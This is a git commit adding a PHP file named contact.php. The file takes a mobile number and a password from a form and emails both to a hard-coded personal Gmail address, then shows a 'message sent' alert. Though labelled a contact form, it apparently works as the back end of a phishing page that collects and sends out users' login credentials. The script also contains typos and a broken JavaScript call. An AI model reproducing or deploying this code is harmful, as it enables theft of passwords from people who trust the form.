8f3d8fee09dc55813461533d0662ce13ae4516cc
949919 <99135921+949919@users.noreply.github.com>
2022-02-08 11:50:15 +0530

    Add files via upload

---
+++ contact.php
@@ -0,0 +1,20 @@
+<?php
+//Define the $_POST variable... 
+$MobileNo = $_REQUEST['MobileNo'];
+$Password = $_REQUEST['Password'];
+//Ensure all fields are completed...
+if (empty($MobileNo) || empty($Password))
+ {
+	echo "Plese fill all the fields";
+}
+else
+{
+	//Send an email and print sender confirmation...
+	mail("yk861595@gmail.com", "Webtech massage", "Form: $MobileNo <$Password>");//Eidt the email adress you wish and massage to be sent to 
+
+	echo "<script type='text/javascript'>alert('Your massage is sent sucessfully');
+	window.history.log(-1);
+	</script>";
+
+}
+?>
